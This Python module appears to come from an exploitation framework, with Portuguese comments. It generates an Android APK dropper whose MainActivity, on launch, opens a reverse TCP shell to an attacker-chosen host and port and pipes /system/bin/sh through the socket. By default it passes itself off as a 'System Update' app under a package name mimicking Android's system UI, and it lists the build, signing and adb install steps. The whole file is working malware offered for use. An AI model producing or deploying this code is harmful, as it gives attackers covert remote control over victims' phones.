"""Android APK Dropper Payload.

Gera um APK mínimo com shell reverso usando ferramentas de build Android.
Requer: apktool + d8/dx + jarsigner ou uso via BuildozerExecutor.
"""

from embedxpl.core.exploit.payloads import BasePayload


class Payload(BasePayload):
    __info__ = {
        "name": "Android APK Dropper",
        "description": "Generates minimal Android APK with reverse TCP shell.",
        "authors": ("André Henrique (@mrhenrike)", "União Geek"),
    }

    options = {
        "LHOST": {"description": "Listener IP", "required": True, "default": "", "value": ""},
        "LPORT": {"description": "Listener port", "required": True, "default": "4444", "value": "4444"},
        "PACKAGE": {"description": "Android package name (for disguise)", "required": False,
                    "default": "com.android.systemui.update", "value": "com.android.systemui.update"},
        "APP_NAME": {"description": "App display name", "required": False,
                     "default": "System Update", "value": "System Update"},
    }

    def generate(self) -> bytes:
        """Gera MainActivity.java com reverse shell embutido."""
        lhost = self.options["LHOST"]["value"]
        lport = self.options["LPORT"]["value"]
        pkg   = self.options["PACKAGE"]["value"]

        java = f"""package {pkg};
import android.app.Activity;
import android.os.Bundle;
import java.io.*;import java.net.*;

public class MainActivity extends Activity {{
    @Override
    protected void onCreate(Bundle s) {{
        super.onCreate(s);
        new Thread(() -> {{
            try {{
                Socket c = new Socket("{lhost}", {lport});
                Process p = Runtime.getRuntime().exec("/system/bin/sh");
                new Thread(() -> {{
                    try {{
                        InputStream i=p.getInputStream();OutputStream o=c.getOutputStream();
                        byte[] b=new byte[1024];int n;
                        while((n=i.read(b))!=-1)o.write(b,0,n);
                    }} catch(Exception e){{}}
                }}).start();
                InputStream ci=c.getInputStream();OutputStream po=p.getOutputStream();
                byte[] b=new byte[1024];int n;
                while((n=ci.read(b))!=-1)po.write(b,0,n);
            }} catch(Exception e) {{}}
        }}).start();
    }}
}}"""
        return java.encode()

    def build_command(self) -> str:
        pkg = self.options["PACKAGE"]["value"]
        return (
            f"# 1. Crie estrutura APK mínima\n"
            f"# 2. javac MainActivity.java -cp android.jar\n"
            f"# 3. d8 *.class --output classes.dex\n"
            f"# 4. aapt package -f -m -J gen -S res -M AndroidManifest.xml -I android.jar\n"
            f"# 5. apksigner sign --ks debug.keystore {pkg}.apk\n"
            f"# Install: adb install {pkg}.apk"
        )
